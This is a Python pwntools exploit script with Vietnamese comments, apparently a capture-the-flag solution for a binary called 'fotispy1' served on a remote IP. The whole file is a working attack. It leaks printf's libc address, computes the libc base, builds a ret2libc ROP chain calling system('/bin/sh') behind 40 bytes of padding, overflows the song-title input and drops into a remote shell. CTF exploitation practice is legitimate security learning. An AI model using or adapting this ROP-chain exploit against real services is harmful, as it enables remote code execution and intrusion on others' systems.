from pwn import *

# Cài đặt context
context.binary = elf = ELF('./fotispy1')
libc = ELF('./libc.so.6')

# Kết nối
p = remote('52.59.124.14', 5191)

def choose(choice):
    p.sendlineafter(b'[E]: ', str(choice).encode())

# --- Bước 1: Chuẩn bị ---
log.info("Step 1: Registering and logging in")
choose(0) # Register
p.sendlineafter(b'username: ', b'user')
p.sendlineafter(b'password: ', b'pass')

choose(1) # Login
p.sendlineafter(b'username: ', b'user')
p.sendlineafter(b'password: ', b'pass')

# --- Bước 2: Leak và Exploit trong một lần gọi ---
log.info("Step 2: Leaking and Exploiting in a single action")
choose(2) # Add a song

# Lấy leak
p.recvuntil(b'[DEBUG] ')
leaked_printf = int(p.recvline().strip(), 16)
log.success(f"Leaked printf@libc: {hex(leaked_printf)}")

# Tính toán các địa chỉ cần thiết
libc.address = leaked_printf - libc.symbols['printf']
log.success(f"Calculated libc base: {hex(libc.address)}")

system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
rop = ROP(libc)
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0] # Cần để căn chỉnh stack

# Offset chính xác là 40 (đã được xác nhận qua debug)
padding = 40

# Xây dựng ROP chain
rop_chain = p64(ret_gadget)
rop_chain += p64(pop_rdi_ret)
rop_chain += p64(bin_sh_addr)
rop_chain += p64(system_addr)

# Ghép payload cuối cùng
payload = b'A' * padding + rop_chain

# Gửi payload làm tên bài hát. Đây là bài hát DUY NHẤT chúng ta tạo ra.
p.sendlineafter(b'song title: ', payload)
p.sendlineafter(b'is from: ', b'artist') # Chuỗi ngắn, không ảnh hưởng ROP chain
p.sendlineafter(b'is on: ', b'album')   # Chuỗi ngắn, không ảnh hưởng ROP chain

# --- Bước 3: Kích hoạt ---
log.info("Step 3: Triggering overflow")
choose(3) # Display favorites

# --- Nhận shell ---
log.success("Success! Enjoy your shell!")
p.interactive()